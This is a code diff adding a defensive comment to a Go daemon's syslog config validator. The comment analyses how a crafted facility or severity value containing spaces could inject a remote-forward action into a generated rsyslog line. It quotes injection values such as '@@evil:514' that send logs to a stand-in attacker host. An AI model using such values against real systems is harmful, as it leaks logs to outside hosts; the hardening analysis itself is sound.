@@ -1951,6 +1951,24 @@ func (d *Daemon) applyRootAuth(cfg *config.Config) (retErr error) {
 // wildcard before building the selector, so an unset facility/severity is
 // ordinary configuration, not an omission to reject.
 //
+// What actually reaches this token, measured rather than assumed. A literal
+// NEWLINE cannot: the lexer normalizes \n and \t inside a quoted value to a
+// space, in both the hierarchical-quoted and the flat-set/peer-sync paths, so
+// the classic "terminate the line and write a fresh directive" injection is
+// not reachable through the config surface. But a newline is not required.
+// Spaces and every rsyslog metacharacter survive VERBATIM — a quoted
+// `"daemon;*.*"` arrives intact, a bare `*.*` arrives intact, and a severity
+// of `"info *.* @@evil:514"` arrives intact. Because the emitted line is
+// `<facility>.<severity>\t<target>` and rsyslog's grammar is
+// `<selector><whitespace><action>`, a token containing a SPACE can push text
+// into the ACTION position of a managed rsyslog line — e.g. a severity of
+// `* @@collector.example:514` renders `daemon.* @@collector.example:514`
+// ahead of the intended target. Whether rsyslog honours any specific such
+// construction is NOT verified here (no rsyslog in the dev/CI environment), so
+// this is deliberately not claimed as proven remote-forward exfiltration; it
+// is more than a merely wrong selector, and the belt closes it either way by
+// rejecting the space along with the metacharacters.
+//
 // Every real Junos facility and severity — `daemon`, `authorization`,
 // `change-log`, `interactive-commands`, `local0`..`local7`, `any`, `none`,
 // `emergency`..`debug` — is ASCII letters, digits and hyphen, so this accepts
